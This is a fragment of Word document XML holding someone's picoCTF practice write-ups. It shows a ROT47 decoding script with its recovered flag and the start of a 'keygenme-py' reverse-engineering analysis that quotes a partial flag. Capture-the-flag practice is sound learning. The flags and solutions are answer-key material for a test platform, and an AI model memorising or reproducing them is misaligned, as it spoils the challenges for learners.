    <w:p w14:paraId="3648E93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#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>+ \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26276FB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w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D7BA7D"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>\\</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>]^_`</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>abcdefghijklmnopqrstuvwxyz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>{|}~"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F50316"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3F8453C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528E217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"""ROT47 decode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A723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740FB1C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xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>NOTE</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>: encode and decode are the same operation in the ROT cipher family.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19251A8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3F76ABA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6A3982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Encryption key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D12023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B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>47</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06ECBCB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310C18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Storage for decoded secret</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DD13F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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="605490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7338705"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decode loop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECFA3F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for</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in</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secret</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED2B3D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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>find</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c</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744B23D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index</w:t>
      </w:r>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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>rotate_const</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">) % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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
    <w:p w14:paraId="01AAC102"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alphabet</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original_index</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBB0B5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8B0045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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>decoded</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A383BA"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lastRenderedPageBreak/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="430155A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569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>def</w:t>
      </w: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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>choose_greatest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253FD4C4"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"""Echo the largest of the two numbers given by the user to the program</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD228A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456EC3D8"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Warning: this function was written quickly and needs proper error handling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455C174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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F4CDA9"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6282BD4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first number? "</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA575B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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>input</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"What's your second number? "</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A1A4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6A9955"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t># need a value to return if 1 &amp; 2 are equal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E24431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202F978A"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586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>if</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&gt;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5CD5581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user_value_1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA1EEE1"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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>elif</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>user_value_1</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt; </w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>user_value_2</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02561D3C"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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>user_value_2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CAC4510"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
    <w:p w14:paraId="37E24E7B"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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">( </w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"The number with largest positive magnitude is "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE9A317"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t xml:space="preserve">        + </w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>str</w:t>
      </w:r>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greatest_value</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>) )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4122A477" w14:textId="77777777" w:rsidR="007D5169" w:rsidRPr="007D5169" w:rsidRDefault="007D5169" w:rsidP="007D5169">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:after="240"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D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="690C2D7D"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r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="6A9955"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>#choose_greatest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133A0076"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151966E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0CC2A497" w14:textId="495C35E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171A2943" w14:textId="3B946349"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The original code did not </w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t>decode_secret</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCD8349" w14:textId="46C008C5" w:rsidR="007D5169" w:rsidRP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u w:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t xml:space="preserve">For decoding, we just need to call </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t>decode_secret</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124D0DE3" w14:textId="311A71C4"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6C2D082F"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CDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>decode_secret</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>bezos_cc_secret</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8B3DCC" w14:textId="77777777" w:rsidR="007D5169" w:rsidRDefault="007D5169" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="332DF07E" w14:textId="77777777" w:rsidR="007D5169" w:rsidRPr="007D5169" w:rsidRDefault="007D5169" w:rsidP="007D5169">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>{1|\/|_4_p34|\|ut_dd2c4616}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A8F296" w14:textId="77777777" w:rsidR="007D5169" w:rsidRDefault="007D5169" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="689C812F" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="537F72BF" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="143E0121" w14:textId="5714C968" w:rsidR="002D0E90" w:rsidRPr="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002D0E90">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>keygenme-py</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="29BE03D0"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79A51E92" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">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2021Reverse Engineering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E92C957" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">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SYREAL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7042E3A5" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">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124375D" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="00000000" w:rsidP="002D0E90">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId100" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="002D0E90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>keygenme-trial.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F035D72" w14:textId="5E42E134" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46C66660" w14:textId="3DA38226" w:rsidR="00866357" w:rsidRDefault="00866357" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A8AE1A3" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Analysis of original code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CFF0B65"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username_trial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"PRITCHARD"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F651216"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bUsername_trial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"PRITCHARD</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33739B27"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513F3B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picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>{1n_7h3_|&lt;3y_of_"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197AB24B"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roofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
